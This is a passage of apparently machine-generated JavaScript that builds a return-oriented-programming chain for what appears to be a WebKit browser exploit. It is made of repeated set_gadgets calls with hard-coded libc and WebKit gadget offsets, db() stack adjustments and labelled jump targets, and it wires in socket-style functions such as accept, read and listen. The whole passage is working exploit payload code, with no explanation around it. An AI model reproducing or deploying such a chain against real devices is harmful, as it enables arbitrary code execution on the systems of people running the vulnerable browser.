libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+782311, //pop rsp
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+14664103, //and rax, rcx
libc_base+763368, //pop rcx
accept_addr,
webkit_base+20307877, //mov [rax], rcx
libc_base+764760 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1201912, //L3477
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+782311 //pop rsp
]);
//L3477:
db([0, 0]); // 0x0
//L3339:
set_gadget(libc_base+764760,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+1438842, //pop rdx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+3236123, //pop r9
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+756281, //xor rax, rax
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+782311, //pop rsp
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+14664103, //and rax, rcx
libc_base+763368, //pop rcx
read_addr,
webkit_base+20307877, //mov [rax], rcx
libc_base+764760 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1203240, //L3478
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+782311 //pop rsp
]);
//L3478:
db([0, 0]); // 0x0
//L3241:
set_gadget(libc_base+764760,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+1438842, //pop rdx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+3236123, //pop r9
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+756281, //xor rax, rax
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+782311, //pop rsp
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+14664103, //and rax, rcx
libc_base+763368, //pop rcx
listen_addr,
webkit_base+20307877, //mov [rax], rcx
libc_base+764760 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1204568, //L3479
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+782311 //pop rsp
]);
//L3479:
db([0, 0]); // 0x0
//L3457:
set_gadget(libc_base+764760,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+1438842, //pop rdx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+3236123, //pop r9
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+756281, //xor rax, rax
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+782311, //pop rsp
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([216, 0]); // 0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967072, 4294967295]); // -0xe0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+14664103, //and rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967216, 4294967295]); // -0x50
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+501646, //mov rcx, [rdi + 0x18] ; lea rax, [rax + rcx - 1]
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760 //pop rsi
]);
db([1, 0]); // 0x1
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+20307877, //mov [rax], rcx
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1205944, //L3480
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+782311 //pop rsp
]);
//L3480:
db([0, 0]); // 0x0
//L3167:
set_gadget(libc_base+764760,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+1438842, //pop rdx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+3236123, //pop r9
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+756281, //xor rax, rax
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+782311, //pop rsp
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
